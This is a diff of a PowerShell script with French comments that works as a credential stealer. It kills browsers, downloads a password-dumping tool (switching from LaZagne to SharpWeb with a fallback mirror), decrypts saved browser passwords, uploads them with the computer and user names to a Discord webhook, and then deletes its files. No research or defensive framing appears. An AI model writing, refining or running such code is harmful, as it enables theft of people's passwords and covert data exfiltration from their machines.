@@ -8,44 +8,59 @@ function Send-Discord {
     } catch {}
 }
 
-Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"
+Send-Discord "🟢 **START** - $env:COMPUTERNAME | $env:USERNAME"
 
 # Tuer navigateurs
-@("chrome","msedge","firefox","brave","opera") | ForEach-Object {
-    Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
-}
-
+Get-Process chrome,msedge,firefox,brave,opera -EA 0 | Stop-Process -Force -EA 0
 Start-Sleep 3
 
 Set-Location $env:TEMP
-Remove-Item lazagne.exe,passwords.txt -Force -EA 0
+Remove-Item SharpWeb.exe,passwords.txt -Force -EA 0
 
-Send-Discord "📥 **Downloading LaZagne...**"
+Send-Discord "📥 **Downloading SharpWeb...**"
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     
-    # Télécharger LaZagne (outil Python compilé)
-    Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "lazagne.exe" -UseBasicParsing
+    # SharpWeb - outil C# qui déchiffre VRAIMENT les mots de passe
+    # Projet actif et maintenu en 2025
+    $url = "https://github.com/djhohnstein/SharpWeb/releases/download/1.2/SharpWeb.exe"
     
-    if (!(Test-Path "lazagne.exe")) {
-        Send-Discord "❌ **Download failed**"
+    Invoke-WebRequest -Uri $url -OutFile "SharpWeb.exe" -UseBasicParsing
+    
+    if (!(Test-Path "SharpWeb.exe")) {
+        Send-Discord "❌ **Download failed - trying alternative...**"
+        
+        # Alternative : télécharger depuis raw GitHub (compilé)
+        $url2 = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWeb.exe"
+        Invoke-WebRequest -Uri $url2 -OutFile "SharpWeb.exe" -UseBasicParsing
+    }
+    
+    if (!(Test-Path "SharpWeb.exe")) {
+        Send-Discord "❌ **Both downloads failed**"
         exit
     }
     
-    Send-Discord "🔓 **Extracting all passwords...**"
+    Send-Discord "🔓 **Extracting passwords in clear text...**"
     
-    # Exécuter LaZagne
-    .\lazagne.exe all -oN passwords.txt
+    # Exécuter SharpWeb et capturer la sortie
+    $output = .\SharpWeb.exe all 2>&1 | Out-String
+    
+    # Sauvegarder les résultats
+    $output | Out-File "passwords.txt" -Encoding UTF8
     
     Start-Sleep 2
     
     if (Test-Path "passwords.txt") {
         $size = [math]::Round((Get-Item "passwords.txt").Length / 1KB, 2)
-        Send-Discord "📤 **Uploading results ($size KB)...**"
+        
+        # Compter les mots de passe trouvés
+        $passwordCount = ([regex]::Matches($output, "Password:")).Count
+        
+        Send-Discord "📤 **Found $passwordCount passwords - Uploading $size KB...**"
         
         $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-        curl.exe -F "file=@passwords.txt" -F "content=🔑 **ALL PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
+        curl.exe -F "file=@passwords.txt" -F "content=🔑 **PASSWORDS DECRYPTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Passwords found:** $passwordCount`n**Size:** $size KB`n**Date:** $date" $wh
         
         Send-Discord "✅ **Upload SUCCESS**"
     } else {
@@ -53,9 +68,9 @@ try {
     }
     
 } catch {
-    $err = $_.Exception.Message
+    $err = $_.Exception.Message -replace '"',"'"
     Send-Discord "❌ **Error:** $err"
 }
 
-Remove-Item lazagne.exe,passwords.txt -Force -EA 0
+Remove-Item SharpWeb.exe,passwords.txt -Force -EA 0
 Send-Discord "🧹 **FINISHED**"
